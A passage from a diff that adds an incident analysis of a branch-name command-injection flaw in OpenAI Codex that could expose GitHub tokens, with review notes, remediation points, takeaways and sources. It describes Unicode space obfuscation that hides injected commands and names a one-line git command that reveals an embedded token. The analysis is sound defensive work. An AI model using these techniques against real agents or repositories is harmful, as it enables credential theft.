+3. **The root cause, while described at a high level, correctly identifies a systemic pattern that the solutions address.** The draft's "Why 5" observation — that AI coding agents carry broad credentials and shell into legacy patterns without re-threat-modeling when those patterns move from trusted developer terminals to HTTP APIs — is the reason why Solutions 1 through 3 are all correct and non-redundant. Parameterized execution (Solution 1) fixes the injection vector; ephemeral scoped credentials (Solution 2) limits blast radius even if injection recurs; credential store isolation (Solution 3) removes the exfiltration value of achieving execution. The root cause, even if stated at a design-philosophy level, correctly motivates a layered remediation approach. A more specific organizational root cause (e.g., "container setup scripts were written by a developer team and not reviewed by a security engineer") cannot be established from the available sources — reporting what is not known from public sources is appropriate.
+
+4. **The BeyondTrust commercial interest concern is already documented and handled.** The `researcher_notes` field explicitly flags that BeyondTrust is a "commercial credential management vendor" and that their automation extrapolations are "PoC projections, not confirmed exploitation metrics." The parenthetical in `potential_damage` provides the same qualification. The inclusion of the automation scenario under these qualified conditions is appropriate — it establishes the upper bound of potential harm without asserting it as observed fact. The headline stat does not reference the automation potential; it focuses on the technical facts (branch name injection, IAT org-wide scope). BeyondTrust's commercial interest is noted and the reader is equipped to apply appropriate skepticism.
+
+5. **The Unicode Ideographic Space obfuscation technique is correctly elevated as operationally significant tradecraft.** The draft correctly identifies this as a qualitatively different threat from simple metacharacter injection: a developer reviewing the Codex UI would see "main" with no indication of a 100-character payload. This is not a theoretical bypass — it is a social engineering layer that defeats human review of agent task inputs. Treating it as a key takeaway (Takeaway 4) and dedicating a full technical sub-section to it is warranted. The developer-visible UI showing "main" while the shell receives the full payload directly undermines the implicit assumption that human review of agent task setup provides a meaningful security control.
+
+### Synthesis
+
+The draft is well-structured and evidence-grounded, with the strongest reporting on the technical mechanisms and the weakest reporting on two points: the P1 classification timing ambiguity and the conflation of two distinct findings (branch injection and CLI credential storage) under a single incident frame. The Challenger's most consequential finding is the P1 timing discrepancy — if OpenAI only formally classified this Critical P1 at the conclusion of Phase 4 remediation (7 weeks after initial report), that changes the vendor response story from "classified P1 within days, hotfixed in one week" to "hotfixed quickly but took 7 weeks to reach P1 designation." The distinction matters for the `vendor_response_time: "1-7 days"` metadata field, which currently captures only the initial hotfix, not the full P1 classification timing. A clarifying note should be added to the remediation section and the frontmatter vendor_response_time field should be annotated to reflect "initial hotfix ~1 week; P1 classification at Phase 4 completion, ~7 weeks."
+
+The @codex IAT severity gap identified by the Challenger is a genuine tension but is ultimately resolved by the AgentFail severity scale's design. The scale correctly distinguishes between potential and actual. The report could strengthen its severity justification by explicitly calling out the IAT Variant 3 as a sub-finding that would independently warrant Critical classification if confirmed exploitation were present — making explicit that "High" is a near-miss adjustment from what would otherwise be Critical. This would resolve reader confusion about why an org-wide credential exposure path is rated High rather than Critical, without changing the rating itself.
+
+The CLI plaintext credential storage finding should be treated as a distinct sub-finding with its own remediation status rather than woven into the main analysis without resolution. A brief note clarifying whether this was part of the same BugCrowd report, whether it received P1 classification, and whether the same 4-phase remediation closed it would sharpen the incident boundary. Without this, the report leaves ambiguity about whether a reader who learns Codex was "patched" can consider the CLI credential storage exposure closed.
+
+**Confidence level:** Medium-High — The core technical facts (injection mechanism, bypass techniques, IAT variant, remediation timeline) are independently corroborated across 5+ high-credibility secondary sources quoting the primary BeyondTrust research. The primary source (BeyondTrust blog) returned 403 at analysis time, which introduces some residual uncertainty about specific technical claims that appear only in secondary quotation. The P1 classification timing and the CLI storage remediation status are the two areas where the sourcing is ambiguous across secondary reports; the overall analysis is sound but these two points lower confidence from High to Medium-High.
+
+**Unresolved uncertainties:**
+- **P1 classification timing** — Did OpenAI classify this Critical P1 at report receipt (Dec 16), at initial hotfix (~Dec 23), or at Phase 4 completion (Feb 5)? This matters for the `vendor_response_time` field and the vendor response narrative. Would be resolved by access to the primary BeyondTrust blog post (403 at fetch time) or by a direct statement from OpenAI's security team.
+- **CLI credential storage remediation scope** — Was the `~/.codex/auth.json` plaintext credential fallback included in the 4-phase server-side remediation, or is it an open finding? If open, the "full_recovery_achieved: yes" frontmatter field is inaccurate for users who installed the Codex CLI. Would be resolved by checking the current Codex CLI source or a follow-up BeyondTrust disclosure.
+- **@codex IAT scope at time of incident** — The IAT "potential org-wide scope" language appears across secondary sources but none confirm whether the GitHub App installation for Codex actually requested org-wide permissions vs. per-repository permissions at the time of discovery. The distinction between "could have requested org-wide" and "did request org-wide" materially affects the Variant 3 blast radius claim. Would be resolved by the GitHub Marketplace listing for the Codex app as it existed in December 2025, or by the primary BeyondTrust report.
+- **In-the-wild exploitation status** — "No confirmed exploitation" relies on OpenAI's telemetry and BeyondTrust's monitoring, neither of which can rule out exfiltration that was consumed by an attacker but never operationalized. Would be partially resolved by a statement from OpenAI's security team on what telemetry was reviewed and what the detection confidence is.
+
+---
+
+## Key Takeaways
+
+1. **AI coding agent inputs are an injection surface — treat them as such.** Branch names, repository URLs, PR titles, commit messages, and any other git context that flows into a Codex-like agent's container setup arrive via an HTTP API. Every parameter that touches a shell command must be validated, normalized, and passed via parameterized exec — not string interpolation. The branch name injection worked because a parameter that ultimately hit a shell was treated as a trusted git argument. This is a category of error, not a one-time mistake: audit every AI coding agent for unsanitized shell parameter injection.
+
+2. **The @codex PR review path demonstrates that agentic trigger surfaces multiply credential exposure.** When Codex could be triggered by a `@codex` comment in a PR, the attack surface extended to anyone who could open a PR against a repository — which, for public repositories, is anyone on the internet. The Installation Access Token scope made exploitation of this path org-wide in consequence. Before adding AI agent trigger surfaces (webhook callbacks, @mentions, automated pipeline integrations), evaluate the credential scope each trigger inherits and who can activate it.
+
+3. **Credentials in process-readable locations are credentials in attacker-readable locations, once command injection exists.** The token embedded in `https://<token>@github.com/...` was readable by `git remote get-url origin` — a one-line command. Credential storage hygiene is not just about preventing direct access; it is about ensuring that arbitrary code execution within the agent's environment does not automatically yield a high-value credential. Secrets managers, credential helpers, and scoped environment injection all reduce the exfiltration value of achieving command execution.
+
+4. **Unicode obfuscation is operational tradecraft, not a theoretical concern.** The Ideographic Space technique made a 100-character injection payload completely invisible in the Codex UI while remaining fully functional in the shell. Developers reviewing Codex task details would have seen "main" and approved without awareness of the payload. Input validation pipelines for AI agents must apply Unicode normalization and non-ASCII character stripping before any display or shell use — not just before validation.
+
+5. **Responsible disclosure with a 3.5-month window enabled full server-side remediation before public exposure.** OpenAI classified the finding Critical P1 within days, deployed an initial hotfix within one week, and completed four phases of remediation over seven weeks — all before any public disclosure. The structured responsible disclosure process (via BugCrowd) and the 3.5-month window directly prevented exploitation of a broadly-available vulnerability. For AI platform operators: investing in accessible, responsive vulnerability disclosure programs pays dividends when a Critical P1 finding arrives.
+
+---
+
+## References
+
+| Source | URL | Date | Credibility |
+|--------|-----|------|-------------|
+| SecurityWeek | https://www.securityweek.com/openai-codex-vulnerability-could-have-exposed-github-tokens/ | 2026-03-30 | High — independent security journalism; day-of coverage; confirms OpenAI P1 classification |
+| The Hacker News | https://thehackernews.com/2026/03/openai-codex-flaw-could-have-exposed.html | 2026-03-30 | High — independent security journalism; day-of coverage |
+| SiliconANGLE | https://siliconangle.com/2026/03/30/researchers-expose-openai-codex-flaw-that-could-leak-github-oauth-tokens/ | 2026-03-30 | High — independent tech journalism; day-of coverage |
+| BankInfoSecurity | https://www.bankinfosecurity.com/openai-codex-bug-could-expose-github-tokens-a-27066 | 2026-03-30 | High — independent security journalism; contains key Tyler Jespersen quotes |
+| VentureBeat | https://venturebeat.com/ai/six-exploits-ai-coding-agents-nine-months/ | ~2026-05 | High — industry analysis documenting this incident as 1 of 6 AI coding agent exploits in 9-month period; broader pattern context |
+| BeyondTrust Phantom Labs blog (primary source) | https://www.beyondtrust.com/blog/entry/openai-codex-oauth-token-exposure | 2026-03-30 | High (primary researcher disclosure) — returned 403 at fetch time; extensively quoted across 8+ independent secondary sources; confirm via secondary sources |
+| MrCloudBook (caution: misleading CVE headline) | — | 2026-03 | Low — article title implies "CVE-2026" but no CVE was assigned; do not use as CVE source |
